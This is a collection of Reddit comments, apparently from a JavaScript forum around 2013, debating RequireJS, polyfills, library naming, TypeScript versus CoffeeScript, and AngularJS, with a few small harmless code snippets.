other tool that we used had such a _high cost_ for using it, and the team made the decision to go with a simple namespacing scheme like you read about in the article. People were happier, the rest of our software development lifecycle wasn't impacted, we could use regular testing tools that didn't have to worry about async loading resources, and despite the knowledge of how to abuse/use the global scope we never had a collision due to our simple namespacing. This has just been my experience, it sounds like you and your team are receiving a number of positive benefits from using Require and that's great! You should keep doing that if it lowers the cost of developing working software and increases developer happiness :) 
It's not exactly deprecated. ES6 will likely standardize it, but as of now it's still non-standard so not all engines support it (IE&lt;=9, for example)
Fair question! If I knew people were using something I wrote, I think my fear of disappointing them would be enough to keep me motivated, to be perfectly honest. But if I had to abandon it for some reason, I strongly believe in passing on the torch if a maintainer can't take care of the project anymore, so I would certainly do my best to ensure someone else could step in before walking away.
&gt; The compatibility argument is also an interesting one; it doesn't take long to find very good arguments for why not supporting **any particular** module format being currently proposed is the better stance to take. The argument is that these libraries should be module system agnostic, not that 'currently proposed' module systems shouldn't be used. Your link for 'very good arguments' is outdated and irrelevant as of require.js 2.x as you can load any script as a dependency, module or not, using the shim config. Loading Backbone, jQuery, Underscore, etc. requires a [couple lines of code](http://requirejs.org/docs/api.html#config-shim). jQuery plugins, Backbone extensions, 3rd party libs... basically any nested dependencies can be loaded properly with trivial effort (I'd be curious to see how you pull this off with less or similar effort). /u/camus1's usage of require in Coordinates.js is antiquated. require() should only be used to asynchronously load modules that aren't commonly used in production that the client specifically requests (and only after the app has loaded). Otherwise define() should be used to load dependencies, which will be loaded and ready before the module's definition function is invoked. I have to agree with /u/drrcknlsn. Reading this article gave me the impression that the author has a very poor understanding of require.js, at least version 2+. I used to use object literals to namespace my code, and even created a utility very similar to your extend. IMO Require is a far superior solution; the code is simpler, more logical/readable, easily extensible, and dependency management is an absolute breeze. Code reuse is extremely easy, and doesn't require namespace changes for each new application, also unit testing is very straight-forward. I hope I don't come across as a dick, I just find it quite surprising that experienced developers can't see any benefits and straight-out dismiss requirejs as a waste of time.
Just discovered this Reddit! Wish I had noticed it a month ago—I could have participated in the discussion back when it was happening! (I'm the author of Lazy.js.) Anyway, I'm going to go through here and respond to a few comments now, as if anybody cares anymore ;) Also, for the record, Lazy.js is very much still a work in a progress. (To be fair, I say that in the project's README.) Stuff like documentation and additional functionality are on the way.
You're right, it isn't done. FWIW, getting some quality docs together is my next priority for the project.
It's a fair objection, but as I explain on the project's website it isn't so black and white. On the one hand, if you DO need an array (e.g., to pass to an external library), then you'll need to call toArray(). But if you're just going to iterate over it in your own code—e.g., to create a DOM element for each item in a list—then you actually don't need an array at all since you can call each() on a Lazy.js sequence and get the same behavior. I would argue that the latter case is actually the "typical" one, which is why in my performance tests I mainly pit Lazy.js against other libraries w/ each() rather than toArray(). But I also give the option of comparing toArray() to value() as well, for the former case. (To see what I'm talking about, visit http://dtao.github.io/lazy.js/ and click on "Benchmark Results.")
COMET has literally nothing to do with localstorage, not sure exactly what you're talking about....
I cant really see the advantages of this library.
[Comet](http://en.wikipedia.org/wiki/Comet_(programming\)) is a set of techniques for pushing data in realtime from the server to the browser. It is a precursor to Web Sockets – basically reversed AJAX (Ha ha, get it? Comet and Ajax, like the cleaning products). It has absolutely nothing to do with the things you're talking about. In fact, if anything, it's the exact opposite of what you're talking about. You are discussing offline caching, i.e. using old, possibly out of date data. Comet is about getting new, fresh data in realtime. 
The only advantage seems to be the quirky name. Sadly, that seems to be the only requirement to make a JavaScript library these days. It's frustrating when I try to find anything actually worthwhile to have in a real codebase. It also makes the language look like a joke and its hard to explain to my co-workers that what I do isn't a friggin' joke and there are real coding challenges to overcome for a web based ui.
So is this like parallel.js with a library name that I'm embarrassed enough by that I won't use it? 
It's kind of like parallel.js's version 2.0, with the advantage being that it's even *faster* than parallel, [as benchmarked by it's developer](/r/javascript/comments/1gsh1j/paralleljs_parallel_computing_with_javascript/canzl0w) [cwmma](/u/cwmma). But the name is a bit strange indeed.
The advantage it that it's speeding up your Javascript by (multi)threading it.
In general, its a 'getting more than you asked for' issue. I have no doubt that using polyfills makes it more maintainable / readable, but for a script this small, I don't expect it to be doing anything outside of the scope of its purpose (i.e. modifying built-in objects). Obviously, now that that non-standard ones have been removed, its less of an issue, but it still looks unnecessary to me. At the very least, you should add a statement on the readme.md saying that it includes said polyfills. 
Thanks!
Did you try AngularJS?
I agree to an extent, which is why I removed the non-polyfill methods, and I think full disclosure and making sure the README points out that those methods will be shimmed is a great idea. I don't view those shims as "doing too much" though, rather the script is making sure that it has what it needs, which feels within the scope of responsibility for any given script. I suppose one could make the argument that if you can offer the same functionality without the shims, you should, but that would just be objecting to shims for the sake of it. 
So would a shortcut method like cw() be helpful? 
Don't worry about it, I'm just one asshole on here with an opinion, you name your lib whatever you want, you wrote it.
The link is a little bit of a bait. They only moved backbone.View to React , they did not drop the entire framework.
You're still modifying global state. You used the global state to get access to `Number` and you changed it instead of using an object in your context you leak it.
fixed
Did you read the article?
Advantages include: - drastically reduced whitespace when setting up web workers - cleaner syntax for using workers - ability to used transferable objects without IE 10 exploding - queuing systems and such for dealing with multiple workers. - shims so that your app that uses workers at least runs in IE9 (even if not that fast) I choose communist because the philosophy behind communism is all about workers just like this library. Also because the domain was available and I couldn't think of anything better, suggestions for better names are appreciated ... seriously.
why not call it commiejs
Hit me up when you have the comparison 
if I went to the trouble to change the name I was planning to move away from the communism theme towards something shorter, I was thinking maybe cwm.js
I must say I don't like that feature. A keyboard support lib should not assume or assist in unrelated tasks like persistence. If users wish to customize key bindings I would rather do it as a part of angular or backbone than as a built in feature of a keyboard lib. For me it smells like bloat or poor design on the part of keys.js. Serialization and deserialiazation don't belong there as there are so many implementation specific needs surrounding such a thing.
yea, just figured if you wanted to keep the same vibe, commie.js (when said fast) kinda sounds like communist, sorta lol
yes
Live a little 
If I wanted the same vibe I could go with cccp.js
You say any time , does this include when they aren't in a browser? Also how did you make someones screensaver start with javascript. Did you just fullscreen the browser? For the screensaver that turns off when someone looks at it did you use facial detection software and then eye detection software? *If you haven't noticed I'm new to javascript*
Keys.js is not actually doing any persistence, only serialization/deserialization. I strongly disagree with the notion that the user should be responsible for objects they may not understand the internal implementation and validation rules for. Unless you are working with plain objects, leaving serialization up to the consumer doesn't make sense, since you must deserialize back into the proper types, which may require additional transformations, or at the very least validation - none of which your users should be relied upon to do correctly for every library they are using. More than likely they only care to know that they can call a function to transform an object to a JSON string, and another to properly deserialize an object given that string. JSON support is provided by all modern browsers, so there is no reason not to help your users properly manage the serialization of objects you provide. I don't see how angular or backbone are going to somehow make this easier, less error prone, or more maintainable. I would also be curious what implementation specific needs you are referring to that would be complicated by the serialization feature keys.js provides.
I wouldn't lump Angular in as a "big framework". It's smaller than Backbone (when you get done including all the other libraries you need just to be able to use it). Plus, the amount of code you need to do anything useful is 10 times smaller than EmberJS as well. [EmberJS](http://jsbin.com/ebusip/41/edit) [AngularJS](http://jsbin.com/agiwuk/3/edit)
Thank you.
No. Sorry. Thank you.
Ditto. What was wrong with parallel.js?
I strongly suspect file size and dependencies weren't the meaning the author was implying. Backbone is a light alternative to traditionally structured (non-framework) javascript apps. It can be used for small components or to structure an entire application, but *none* of it is *required*. Angular pushes you to re-write your entire application with a new structure and abandon traditional methods like template libraries and direct DOM manipulation. That's a pretty big difference from refactoring one Backbone View.
I should have made myself a bit more clear. I wasn't re-suggesting that the OP should use AngularJS; I was making clear that AngularJS isn't a "Big Framework". Sure, it can handle massive projects, but in a very modular way. edit: And you can do direct DOM manipulation with AngularJS; they are called [Directives](http://docs.angularjs.org/guide/directive).
Definitely a bit, but folks familiar with the frameworks will know that React isn't really *trying* to replace any part of Backbone but the views. Dropping *all* of Backbone for React would just be silly.
I think people are confusing big with opinionated, as most big frameworks are also opinionated.
The name is really no worse than any other library name out there. I really don't see what there is to be embarrassed by if the library provides any useful abstraction over existing libraries. People are over-reacting to the naming of the library, and naming a library 'communistjs' that deals with 'workers' is actually fairly appropriate. 
&gt;Communism has a pretty negative connotation in the west. Only if you are a right-wing nutcase. It's a freakin javascript library that deals with 'workers'. If someone can't see that correlation, and that the connotation isn't that this library espouses the ideals of Carl Marx, then they are a nitwit. 
You have overwritten your this.tile with integer somewhere. It is the same as you would do: var a = 2; a.apply();
Don't worry about the name. It is a great name.
Subject has been successfully brainwashed
It was taken by... Parallel.js
Good point
I love the name, keep it.
Let's raise the bar &gt; Try Hitler.js - best way to sort objects!
Another issue with shims is that anyone can come along and make a different implementation, which your code will use. If I (as a user of Key.js) want to make a shim of "map" that only works in the context of my application, I shouldn't have to worry about breaking your code. EDIT: I don't know what the word shim means ^
I saw this written about earlier this month: http://blog.pamelafox.org/2013/06/referencing-dom-from-js-there-must-be.html?utm_source=javascriptweekly&amp;utm_medium=email It's definitely a cleaner way to define those elements. You may want to comment on the blog and let them know about it.
How about [Backbone.ComponentView](https://github.com/rhysbrettbowen/Backbone.ComponentView)? It's based on the Closure Library component and gives you handles for it's lifecycle (see https://code.google.com/p/closure-library/wiki/IntroToComponents). It should give you everything that you said you needed in the article while still being flexible enough to use any templating engine.
and the future of javascript is.... to write it with another language! but seriously, it's great to have JavaScript as a compile to language and having other languages compile to it is a good thing.
nice project. Perhaps a step param for numbers would be nice, or a format string you could use to generate a random string. Something like: DD-MMM-YYYY to generate a random date. And perhaps you could pass in other optional params with it, such as what numbers the DD or the YYYY should be between. I can see this being very useful with generating random JSON responses when testing
Thanks! Yeah, I was grappling with some ways to pass in a regex and generate a random thing based on that regex -- it's definitely on my radar/roadmap but it's a pretty tricky beast to get right.
Approximately 
It doesn't really have one. Either you are a programmer and can edit all objects or you are a player and all you can do is interact with the world.
TypeScript is the shit! Especially with a good editor with full support for it (Visual Studio or WebStorm) And it's so much like ActionScript 2, even in how the typing is compile time only and produces untyped code (but pre-checked for errors).
ActionScript 2? ewww lol. I always thought it was more like actionscript 3 but i have only ever read about typescript I have never used it. 
I like it!! I've been working on something that needs scheduling during the weekend, hopefully I'll finish it up more quickly now that I have this.
That post is what inspired my plugin :) I commented on it a couple days ago. Pamela approved :) EDIT: Also thanks!
I like it.. Haven't used it, just used some minutes watching your samples.. And it definately looks useful! Now I just need another phone-format. Really nice job!
If you are overriding Array.prototype.map (for example) in your application with a non-standard map function, then you are going to break any library you are working with that makes use of map, not just one that shims it. Shimming native functions that are defined in modern browsers, but aren't available in every browser you wish to support, means you should be doing the legwork to ensure that the calling conventions, behavior, and return values of your shim should be as close to the native functions as possible. Which in the case of Keys.js, is what I've attempted to do. If you were to come along and have your own shim that does the above, and it overrides mine, Keys.js would still work, and vice versa. It's only if you were trying to override map with non-standard behavior that a problem arises, which brings up the question of why you are overriding native functions with your own behavior and expecting third party libraries to continue functioning normally. Shimming is not the same as extending or overriding! I see absolutely nothing wrong with shimming (unless it's a bad shim which doesn't actually match the native function's behavior), extending is questionable, and overriding is just plain bad (by overriding, I mean changing the behavior of a standard function).
re: "JS on the server" -- MS introduced XMLHttpRequest years before Google rocked the world with it, but people typically credit Google with the explosion of AJAX. I think the argument can be made that node.js should likewise be credited with the explosion of JS on the server regardless of prior implementations. Certainly we should give credit where it is due, but node.js made cross-platform, server-side JS practical and popular. EDIT: typos made by fat fingers
I've been looking for something like this for a while, thanks for posting. 
Just because you weren't around doesn't mean it wasn't being used. If you think node.js has "exploded" then you might want to check your figures. node.js is just as obscure as any other server-side javascript implementation when compared to more 'traditional' back-end technologies. node.js has not really made much of an impact, it is still a niche technology. node.js doesn't even register on any statistical reference. https://www.google.com/search?num=100&amp;newwindow=1&amp;safe=off&amp;site=&amp;source=hp&amp;q=server-side+programming+languages+statistics&amp;oq=server-side+programming+languages+&amp;gs_l=hp.3.1.0l2j0i22i30l8.2501.10601.0.13095.15.14.1.0.0.0.153.1264.10j4.14.0.cqrwrth.1.0.0.0..1.1.17.hp.YZuulZeXmC8 Show me some proof that "node.js" has fostered any "explosion of JS on the server". It just doesn't exist. I would concede if you could show me a statistic that says node.js has even 0.1% market share. I admire your enthusiasm, but you are living in a bubble. 
an alternative I have used in the past: https://github.com/StefanLiebenberg/cron.js/
Is it just me or does this guy need $20.000 and months of time to rebuild something in javascript that linus build in 3 days?
This is definitely a great library as well. The one problem I had is that it isn't very flexible, as in it doesn't natively support composite and exception schedules or custom time periods. That's really what I was trying to accomplish with Later.
That's the great part about Later, the schedules are completely deterministic. If something crashes, simply run the same exact command again (with the same schedule definition which can be serialized and stored) and it will fire exactly when it would have as if no crash had occurred.
I also use [Faker](https://github.com/marak/Faker.js/) for generating random names, addresses, email, etc. It doesn't do any of the random number generation though - for that I've been using [d3.js](http://d3js.org) which supports creating random numbers using various distributions (normal, log-normal, and Irwin–Hall). Would be nice to get all the functionality from one Library with a consistent interface.
cw is now a shortcut to communist and communist.noConflict() is now a method. 
It might be a matter of following open source initiatives or using products from companies that they trust, for most people. I'm mostly invested in using CoffeeScript and Mascara for my projects as they let me write in ES6 right now or promise to transpile to ES6 when it comes down to it in the future. I've tried to look at traceur-compiler by google too, but didn't spend too much time with it. TypeScript might be good. If you're starting from scratch, give it a shot. Nothing should prevent you from giving it a fair chance. Just be aware of Microsoft's history of aggressive backward's compatibility choices or the polar opposite, blatant disregard for backward's compatibility. They've done both. So, ymmv.
I've not researched coffeescript much because, although this can be overcome, I don't care really for the syntax. Does coffeescript have a nice implementation of classes/inheritance much the way that typescript does? If so perhaps I'll just head in that direction.
I've stayed away from that part of coffeescript because it's only being used to write step definitions for my test cases. So it's quite simplistic. I'm lead to believe that the [class comprehension is quite close to ES6](http://coffeescript.org/#classes). // ES6 class Foo extends MyApp.Bar { constructor (baz, monkey) { ... } private myPrivates = "can't touch this"; public lookAtThis = "I've got nothing to hide"; } vs # Coffeescript class Foo extends MyApp.Bar constructor: (@baz, @monkey) -&gt; ... myPrivates = '''Can't touch this''' @lookAtThis = '''I've got nothing to hide''' 
MS has a tendency to ditch products too, which leaves you hanging. Imagine them killing it 2 years down the road when you have 50k lines of typescript. I too am seduced by it, i want refactoring! That said, unless its available as an Eclipse plugin with drag and drop refactoring, I'm not really interested. I already have linters for js.
That's an imperative way of doing data bindings. Just looking at the HTML, I'm not able to discern if that functionality is actually setup or not. I would need to go to the javascript that actually runs that page and have a look. Then I would need to match up the form ID with the 'document.getElementById()'. I really like the declarative nature of AngularJS in that I can have a look at the HTML and know exactly what is going on. I also know exactly where my scope is and what scope I'm in. So to answer your question, yes, I do have many doubts about Knockout.
Why not CoffeScript/IcedCoffeScript/^ClojureScript/^Coco/^Dart/^Emscripten/^Javascript++/^..^..^.. This is why I stick to plain JS.
meh, you've never used it but are sure quick to judge. If i'm doing nothing but trying to create a simple page with binding ill take ko over most of the other frameworks and the boilerplate that's required just to get up and running. 
With regards to your edit, I was merely showing that AngularJS could be even less code than Knockout. If you don't want the model initialised in the view, then [checkout this](http://jsbin.com/agiwuk/12/edit).
The short answer is, you can't rely on any javascript tech being permanent right now, but Typescript is actually (in my opinion) pretty compelling, especially for someone with your desires and background. [Look at the Raytracer example here.](http://www.typescriptlang.org/Playground/) Look at the javascript code it compiles into. You could basically just modify that source, right? If Typescript stops being useful, you should still have sane source. Typescript does nothing more than add type safety and class structure with no frills. The Raytracer code is slightly _longer_ in Typescript, because all Typescript does is force a sanity check before becoming raw JS. --- A longer answer: even the people who are absolutely sure that Web Components Herald The Future And Coming Renaissance of the Browser are mostly just talk. No one knows where javascript is going. That's because there are lots of strong solutions and lots of strong disagreement. The good news is that you can't be burned too badly by working with something new, because even if it doesn't work out long-term, you'll only be as screwed as most everyone else that invested in a tech. And a big plus: you'll have more experience working with javascript, which is gonna be around in some form or other. (I don't think it's going to change at all, to be honest.) The other thing you might consider is **flexibility of commitment**. The reason Typescript, Coffeescript work is that there's a pretty quick 1-1 mapping to javascript source. Typescript is actually especially good at this, better than Coffeescript because Coffeescript likes doing neat things for the hell of it (last line implicitly returns). (That's not (entirely) meant to be a criticism of Coffeescript, because what makes Coffeescript wonderful is wild exploration.) Honestly I'd say you should try switching to TypeScript--maybe only because I want to hear how it turns out! 
this is closer to how i would want to work with my models. fooling around a bit, im not sure what the difference is between your example and [this](http://jsbin.com/agiwuk/14/edit), which i find preferable.
So does testing. It's a god damned clusterfuck looking way to write lists. You'd probably get laughed at and told to change it at my work.
That's fine to use the $scope variable and was previously the only way to interact with the view. Now v1.1.5, you can use the '[Controller as](http://www.egghead.io/video/tTihyXaz4Bo)' syntax so you don't even have to inject the $scope variable. Plus it forces you to use the dot notation in your view to combat any unwanted scope inheritance overwriting your model values (i.e. using something like ng-repeat). [Here's a video that explains it](http://www.egghead.io/video/DTx23w4z6Kc).
You're funny, and stupid... way to go former marketing presentation director.
1. Tooling is by necessity more complicated. That means you have an added build step and a more complex debugging workflow. 2. You can't tune the exact output of any given module file. 3. It's not JavaScript. I find TypeScript very attractive. The combination of trying to skate where the pick is going (modules, classes), strict superset of JavaScript, and static type analysis is exciting. I haven't gotten buy-in to use it in a real product yet, though. 
Unlike Silverlight and Bob, TypeScript is apache-licensed open-source. There's at least a reasonable chance the project could survive past MS' involvement.
hahaha, awesome! i remember doing this kinda stuff years ago with mode 13h and pascal. good times. :-] definitely different from a straight-up procedural language, nice work, OP!
http://vanilla-js.com/
I think this is a really good idea, but definitely could use a bit of streamlining, but I'm sure thatll come with time.
Try this: http://pastebin.com/aaxSW2z8
It worked for me when I plugged in absolute paths to fancybox. I'm guessing your relative paths to the fancybox library or your images are out of whack.
The twist with typescript is that it is open source, apache licensed, aims to be like es6 and is available for non Microsoft editors. Those slimy bastards!
[Relevant.](http://i.stack.imgur.com/ssRUr.gif)
The way I see it, it's doing yourself a disservice to have a general anti-Microsoft stance. It's perfectly OK to hate certain products, or certain decisions, that they have made, but they are such a varied company doing so many different things, and have made such a contribution to computing in so many different areas, that avoiding their products is avoiding quite a lot. Keep an open mind, make your decisions based on the product, not on the company. I use Ubuntu for servers, Microsoft for my desktop OS, Android for my phones and tablets, Logitech for my peripherals, Nintendo for my console, ...
Its written by the same chap who wrote c# and right now he's dedicating 50% of his time to TypeScript. Microsoft has the big guns on this project.
TypeScript support is built in to IntelliJ http://www.jetbrains.com/idea/webhelp/typescript-support.html
&gt; ~~MS~~ *every technology company* has a tendency to ditch products too 
This usually implies a negative, but I don't see how it's a negative in this case. JavaScript needs help on large projects for everyone, including Microsoft. TypeScript is open source. If by some chance Microsoft drops it and the open source community stops supporting it, you still have very well formatted JavaScript equivalents of your TypeScript files.
Very cool. I especially like how I can see the source.
That is both hilarious and really sad.
This Is a good answer. One thing people should keep in mind is that TypeScript compiles to IDIOMATIC JavaScript, so if you ever abandon TypeScript, you can hold on to your codebase. Whereas other languages like Dart compile to JS that is optimized but in no way human readable or editable. This is also useful for transitioning an existing codebase...
Don't feel so bad; the image is just poking fun at a small, unfortunate subset of the web design community. It's fake! But check out the sidebar in the image for added luls. 
That is seriously cool. I wish that was the clock on my phones lock screen.
The main advantage of Javascript is that you dont need to specify types. TypesScript negates that. Once you go down the road of typed programming, .Net starts to look much better. So TypeScript is a way for Microsoft to simultaneously cheat their way into the JS tooling and compiler markets while neutralizing JavaScript as a competitor compile target. Very obviously embrace, extend, extinguish and I am quite amazed that so many web developers are distracted by this.
Real slick there, bud. 
That's very original! I saw a bug - when I select "Show am/pm" - the particles get added to the M and not the number! Is this a task left to the reader? edit: ah, never mind, I think all the fluid is fed in from the right, and wiggles around the numbers from right to left.
Personally, I just follow the CommonJS standard and then either put an ``if(!module || !module.exports) { window.thing = thing; }`` if it has no dependencies itself, or use browserify to bundle the dependencies and a simple shim file that simply does ``window.thing = require('thing');`` and then let the library users use whatever mechanism they prefer to work with the code.
browserify can even generate a UMD shim for you automatically with --standalone
The coffeescript is more like enabling a stronger sugar around JS. It isn't any more type safe than JS itself. 
I really like TypeScript, and have been using it on a major project of mine. I like it enough that I might start using it over JS. However here are some issues I have so far. * First, it being a superset is more of a technicality. In practice you end up with two worlds; the world with typing and the JS world where everything is 'any'. Where they cross, can be ugly, or can end up with just losing all typing. * Inference can only really be trusted for the *very* trivial stuff, such as `for ( var i = 0; ...`. Otherwise it's very easy to lose typing in places where you through the inferring would be obvious. The inference can be a bit too hit and miss. * I've had problems where a bug in one file, can cause errors elsewhere to be made (i.e. if this is an error, then that is an error too). TypeScript however has reported the latter errors, and not the original cause. This may however be fixed in the latest version (they have done a lot of work on compiler bugs). * The syntax for typing at times feels very quirky, especially when you are starting out. Sometimes I end up writing the same type information multiple times, until I find one that doesn't error. * Methods can have multiple type signatures, however they cannot have multiple bodies. So you have one body, and within that body you then work out the type of the parameters, yourself within it. That also means having to cast it around to get it into the right type, adding on more code. This is really due to the fact it's just 'JS with types'. * Some of the type signatures can be long, like 'makes Java look terse' long. * Type signatures can get very complicated, fast. Especially when it's normal to have things take or return a function in JS, and in TypeScript you can describe a type by it's structure. Stuff like "a function that takes a function which returns a function that returns bar, returns a function, which takes a function and returns foo". * There are times you need to cast via any, such as: `var f:foo = (foo)(any) bar;` to get around limitations. * There are some niche structures which are painful to model in TypeScript, although TypeScript 0.9 has made some improvements in this area. For example it's now possible to do functions with properties, without having to cast via 'any'. * It's possible to have a JS library, where the structure of the result is based upon the data given; essentially dependent types. You cannot model this type of stuff in TypeScript, so you lose some of the static typing benefits. * edit: I would add on that so far in *every* release of TypeScript, I have had to change code. This is because there is either a new/better way of doing things, the type system has been made stronger (and so ambiguities are now flagged as errors), or because oddities in syntax which didn't matter before have just been flat removed. All in all, I love TypeScript!
I have lots of respect for Heilsberg. Turbo Pascal, Delphi, C#, and now TypeScript. According to legend, Microsoft sent a limo with a briefcase with a million bucks in it as his job offer. 
It's fully open source, so even if MS ditches it (which I doubt), the community will continue their work.
Because JavaScript is perfect and there's absolutely nothing to improve upon. Why do you think we have so many JS dialects?
Don't really have anything valuable to contribute... just wanted to say I'm impresed and intrigued. I looked in to Kendo a whiel ago when I was talking to a client who wanted a mobile app. This addition to their arsenal makes them even more compelling as a solution.
TypeScript is opensource.
really cool man
&gt; and have made such a contribution to computing in so many different areas, I'm afraid I don't share your rose-tinted view. My own recollection of the last 25 years is that Microsoft have done more to restrict progress in computing than anyone else. Let's not forget this is the company that tried to convince us that the internet was just a fad and that we'd all be better off being locked into the Windows-only MSN instead. This is the company that started the browser wars and tried to embrace, extend and extinguish the open standards on which the web was based. This is the company that created IE6 and then did nothing about it for years and years. I could forgive all that if they wrote decent software. Alas, the vast majority of it is shit. The good stuff (SQL Server comes to mind) they bought in.
but it is written Microsoft all over it. And nobody is going to maintain that mess if MSFT drops it.
Looks cool. Thanks for sharing. I've implemented something way smaller in scope. See [generators.js](https://github.com/bebraw/generators.js). It focuses on basic data types. I guess the most interesting feature is that structure generator that combines uses them all. Very handy for fuzzing. Otherwise it's way inferior to yours. :)
In that case, use Dart, by a truly open source company that care about the technology and its users.
Open Source... or Microsoft Open Source where you can't contribute, fork, or use it in any way?
Awesome!
That is cool reminds me of my slime text that uses the same concept. http://codepen.io/loktar00/pen/xyLHD combined with my other pen that I started to use metaballs for then just went 3d crazy http://codepen.io/loktar00/pen/HDilG I like how you handle your "forces" in the code to update the areas.
/r/fifthworldpics is leaking.
The jQuery dependancy is pretty useless. Just change the $.each to a for loop and the $() to document.querySelectorAll.
I like these code pens, but really wish there would be a blog article that goes with them to explain how they work
Cool library, a few critiques: - Please don't add polyfills in your library. Leave the end user of your library (the developer) to do that for himself. If you need something like a map or a reduce, write a simple function to do that for you and try to leverage something that exists if it's there, but don't go changing global types like Array for me. - On the `indexOf` polyfill: What browser are you worried about not supporting that? Is it really a browser you want to support? - To help with file size: create functions *that are internal to your closure* to do common tasks. This goes back to the no polyfills stuff. For example: (function (window) { function forEach(collection, fn) { for(var i = 0; i &lt; collection.length; i++) { fn(collection[i], i); } } function alert(msg) { window.alert(msg); } forEach([1,2,3], function(val, i) { alert(i + ':' + val); }); })(window); which will be minimized to something more like: (function(a){function b(a,b){for(var c=0;a.length&gt;c;c++)b(a[c],c)}function c(b){a.alert(b)}b([1,2,3],function(a,b){c(b+":"+a)})})(window); Notice the conversions: - `window` is now `a` - `forEach` is now `b` - `alert` is now `c` why? because they only exist in the closure. If you start adding things to global prototypes or the window object, then they have to keep their full names, and it will make your script longer. Anyhow, I hope that helps.
Just provide the guts of the code. If people want to wrap it then they can. Otherwise just pick one, it takes 5 minutes for someone to change the wrapper
Im also using it to match the appended elements to the selector that was passed in. The only other viable option is to bundle it with sizzle. See line 18 "if($(node).is(key)){".
&gt;No one knows where javascript is going. No one knows where javascript is going? I can tell you one thing, any updates to Javascript won't be breaking existing JS1.5 code, so it isn't "going" anywhere if you keep writing plain vanilla javascript in 1.5 syntax. To change JS in web browsers too much would be to break 90% of the web, and that is simply not going to happen. While you can write Javascript in JS1.6, JS1.7, JS1.8 and other various mutations, it is not supported by all browsers and so JS1.5 is the 'de facto' standard target language, and will be for quite some time to come. Your supposition that nobody knows where javascript is going doesn't account for the last 18 years where javascript has not changed much at all, and the next 18+ years where javascript will not change much at all because changes cannot be made that would break most of the web. It is perfectly safe to continue coding Javascript 1.5. There is no necessity to stop coding javascript in favor of other dialects. There is much more volatility in new technologies such as Typescript, Dart and Coffeescript, etc, especially coffeescript which introduces bugs into the programming syntax with new releases (as seen in the coffeescript 1.5 debacle). 
 var match = function(element, selector) { // use native match var matchesSelector = element['webkitMatchesSelector'] || element['mozMatchesSelector'] || element['oMatchesSelector'] || element['msMatchesSelector'] || element['matchesSelector']; if (matchesSelector) { return matchesSelector.call(element, selector); } // else see if element is in it's parent if calling the selector on it var parent = element.parentNode; var els = parent.querySelectorAll(selector); return els.indexOf(element) &gt; -1; }; There, although I used the array indexOf which may not be available but I'll leave that up to you. You may also want to make a check for how to run the match query first and cache that rather than checking for the existence of the MatchesSelector function each time
You can use the source any way you'd like. It's not surprising that Microsoft or Google Dart are picky about the pull requests they accept.
IE8 can't handle Dart, actually, but we're all waiting for the day we can drop IE8 like Google did last year. Microsoft dropped support for IE7 so I'm sure IE8 isn't far behind. Hopefully XP users will wise up and switch to Chrome or Firefox or Opera.
I don't blame Google Dart for not supporting IE8, but unfortunately I have to for the time being. Microsoft support for WinXP/IE8 expires Apr 2014.
Most console polyfills I found elsewhere actually *created* a box on the screen and put output there! I wanted one that just let `console.log` falls happen gracefully without causing errors.
Was expecting meatball particle clock, still cool.
The reason is because of the model. For serialization and deserialization to work it means that Keys.js is dictating the model to be used for persistence of key bindings. For example lets say I wish to have user editable preferences with a model that has interrelated options for the user that incorporate key bindings. With a pure binding library, this means the developer can structure this paradigm however its needed to fit the specific use case. You could simply iterate over the "options" object for example, and bind appropriately. Serialization is really only necessary if the library has an over-complex internal structure that cannot easily be persistence as a part of your implementation's generalized model handling (I proved backbone and angular as examples of js frameworks that do a great job with handling the model). Or you have some very very lazy and simplistic use-cases were the internal model of the library (something which is not required for a binding lib anyway) is enough to provide management. This is just about separation of responsibilities, binding should be about binding, and modeling should be about modeling. Binding libs should not help with modeling, and modeling libs should not help with binding. The only acceptable overlap is in frameworks, but even then these should be separate moving parts. You also stated that users (consumers of code) should not be relied on to manage objects that are a part of libraries. I fundamentally disagree. If the libraries selected follow basic principles, and the developer is a decent developer, its certainly not asking too much. Frankly far to much of the web is written to make life easier for the lazy and incapable, and no that does not make a library better; its a vice that needs to be called out. JSON support is immaterial in this case as it only handles basic objects, for example you cannot serialize a function or a date into JSON. JSON is not a solution to this problem unless your model is simple enough (it should be) to manage serialization and deserialization without the aid of more support code. In other words "there is no reason not to help your users properly manage the serialization of objects you provide." The reason not to is that its bloat.
It is an ambitious idea of mine but I feel like there would be some use of an anti-library code whose purpose is to strip out pointless library dependencies.
&gt; eval("…") isn't evil, it's just the worst possible way to implement the requirement "Programs should be able to write programs." Discuss.
This is the company that gave us DOS, and Windows. It's the company that convinced the IBM PC world to move to a graphical desktop. It's the company responsible for Microsoft Office, *the* killer app for desktop computers as much as we love to hate it. And along the way they've given us gems such as more ergonomic mice, some great tools for software developers, and more. The number of small innovations they made in subsequent versions of MS-DOS, then Windows, then Windows NT, OS/2, etc which went on to influence other operating systems probably can't be counted (and I'm not discounting the similar massive contribution Apple made in this area). Being slow to jump on the world wide web? That's one example of a mistake, and slightly quoted out of context - Microsoft were frantically trying to create their own better web, competing with the world wide web - something that America On-Line was also doing. This ultimately failed, because the web was such an open network and set of protocols that anybody could use and exploit it equally, and Microsoft was a bit slow to catch on to that concept (still is!).
This is very fair criticism. Thanks for the comment.
I prefer to build a Blob on the fly for my metaprogramming needs, but only to avoid the (advertised) runtime penalty of eval-ed code. The only cons of that, stated that I don't care that much of squeezing ms from the bootstrap sequence of my applications nor of supporting ancient browsers, is that this operation cannot be made synchronous...
&gt; This is the company that gave us DOS, and Windows. I'm sure you're aware that there were other implementations of DOS and window management systems before Microsoft came along. The same is true of word processing, spreadsheets and other other software that comprises MS Office. I think it's more accurate to say that they established these things as standard for home and business PCs. I would argue that this was more through anti-competitive business practice than by virtue of the quality of the software or innovation, but I concede that's it's open to debate. Anyway, I completely agree with your point that one should keep an open mind and evaluate the product, not the company. And I don't disagree that they've made important contributions. It's just that I feel they've done more harm than good in the long run.
&gt; I can tell you one thing, any updates to Javascript won't be breaking existing JS1.5 code, so it isn't "going" anywhere if you keep writing plain vanilla javascript in 1.5 syntax. To change JS in web browsers too much would be to break 90% of the web, and that is simply not going to happen. Exactly fucking correct. The only real predictor is the inertia of ubiquity. 
Very nice. Now Angular has bindings for at least two solid UI frameworks.
inspired me to whip up an alternative to using get and set that doesn't use defineProperty: https://github.com/rhysbrettbowen/Backbone.ModelAttrs it's a little more like the jQuery api
The real WTF is that you got bit by this, considering that your blog post *"More than you ever wanted to know about "this" in JavaScript"* was pretty comprehensive. Ah well, happens to the best of us I 'spose.
